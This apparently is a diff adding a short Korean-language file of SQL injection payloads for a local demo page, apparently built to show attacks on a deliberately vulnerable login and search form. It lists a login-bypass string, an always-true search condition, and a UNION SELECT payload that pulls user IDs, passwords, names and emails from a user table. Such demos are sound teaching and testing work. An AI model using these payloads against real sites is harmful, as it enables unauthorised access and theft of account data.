@@ -1,0 +1,12 @@
+# SQL Injection 공격 페이로드
+# 데모 페이지: http://localhost:8080/demo/sql-injection
+
+## [취약 로그인] 로그인 우회
+# ID 입력란에 아래 값 입력 / PW 는 아무거나
+admin' --
+
+## [취약 검색] 전체 행 조회
+%' OR '1'='1
+
+## [취약 검색] UNION SELECT — user_tb 계정 전체 탈취
+%' UNION SELECT 1,user_id,user_password,user_name,user_email,user_gender,0 FROM user_tb --
